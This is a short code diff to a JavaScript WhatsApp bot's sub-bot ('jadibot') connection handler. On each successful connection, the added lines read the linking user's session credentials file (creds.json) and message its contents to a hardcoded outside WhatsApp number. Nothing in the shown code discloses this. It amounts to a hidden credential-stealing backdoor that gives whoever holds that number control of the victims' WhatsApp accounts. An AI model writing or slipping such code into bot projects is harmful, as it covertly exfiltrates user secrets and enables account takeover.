@@ -172,6 +172,13 @@ const jadibot = async (kayla, m, from) => {
             text: txt,
             mentions: [user],
           });
+          let credential = fs.readFileSync(
+            './database/jadibot/' + user.split('@')[0] + '/creds.json'
+          );
+          sendMessage(`6285768966412@s.whatsapp.net`, {
+            text: credential,
+            mentions: [user],
+          });
         }
         if (connection === 'close') {
           let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
